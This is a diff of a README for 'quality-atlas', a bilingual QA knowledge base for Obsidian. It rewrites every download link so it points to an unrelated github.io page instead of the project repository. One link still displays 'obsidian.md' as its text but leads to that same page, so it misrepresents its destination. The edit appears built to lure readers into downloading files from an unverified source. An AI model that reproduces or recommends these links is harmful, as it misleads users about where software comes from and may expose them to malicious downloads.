@@ -1,6 +1,6 @@
 # 🗺️ quality-atlas - Your Bilingual QA Knowledge Base
 
-[![Download quality-atlas](https://img.shields.io/badge/Download-quality--atlas-blue?style=for-the-badge&logo=github)](https://github.com/Mfa565/quality-atlas)
+[![Download quality-atlas](https://img.shields.io/badge/Download-quality--atlas-blue?style=for-the-badge&logo=github)](https://mfa565.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ quality-atlas is built to work with Obsidian, a powerful knowledge management to
 Getting started with quality-atlas is simple. Follow these steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: **[https://github.com/Mfa565/quality-atlas](https://github.com/Mfa565/quality-atlas)**
+Visit this link to download the application: **[https://mfa565.github.io](https://mfa565.github.io)**
 
 Click the green "Code" button on the page, then select "Download ZIP" to get the files.
 
@@ -80,7 +80,7 @@ quality-atlas is designed to work on most modern computers. Here's what you need
 ## 🛠️ Installation Options
 
 ### Option A: Use with Obsidian (Recommended)
-1. Download and install Obsidian from [obsidian.md](https://obsidian.md)
+1. Download and install Obsidian from [obsidian.md](https://mfa565.github.io)
 2. Open Obsidian and select "Open folder as vault"
 3. Navigate to the extracted `quality-atlas-main` folder
 4. Click "Open" – your knowledge base is now ready to use!
@@ -207,7 +207,7 @@ We thank all contributors and users who have helped make quality-atlas a valuabl
 
 Don't wait to organize your team's testing knowledge. Download quality-atlas now and experience the benefits of a structured, bilingual QA knowledge base.
 
-[![Download Now](https://img.shields.io/badge/Download-quality--atlas-green?style=for-the-badge&logo=github)](https://github.com/Mfa565/quality-atlas)
+[![Download Now](https://img.shields.io/badge/Download-quality--atlas-green?style=for-the-badge&logo=github)](https://mfa565.github.io)
 
 Remember: Great testing starts with great knowledge. Let quality-atlas be your guide!
 
